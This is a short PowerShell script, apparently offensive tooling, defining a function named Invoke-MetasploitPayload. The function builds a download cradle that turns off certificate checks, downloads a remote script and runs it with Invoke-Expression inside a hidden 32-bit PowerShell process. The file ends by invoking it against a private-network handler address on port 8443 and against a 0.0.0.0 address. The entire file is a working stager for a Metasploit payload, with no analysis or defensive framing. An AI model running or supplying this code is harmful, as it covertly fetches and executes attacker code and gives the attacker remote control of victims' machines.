function Invoke-MetasploitPayload 
{

[CmdletBinding()]
Param
(
    [Parameter( Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [string]$url
)
    $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
        if([IntPtr]::Size -eq 4)
    {
        $PowershellExe = 'powershell.exe'
    }
    else
    {
        $PowershellExe=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
    };
    
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName=$PowershellExe
    $ProcessInfo.Arguments="-nop -c $DownloadCradle"
    $ProcessInfo.UseShellExecute = $False
    $ProcessInfo.RedirectStandardOutput = $True
    $ProcessInfo.CreateNoWindow = $True
    $ProcessInfo.WindowStyle = "Hidden"
    $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
}
Invoke-MetasploitPayload -url https://192.168.100.147:8443/dDapJzwe1x
Invoke-MetasploitPayload -url https://0.0.0.0:8443/dDapJzwe1x
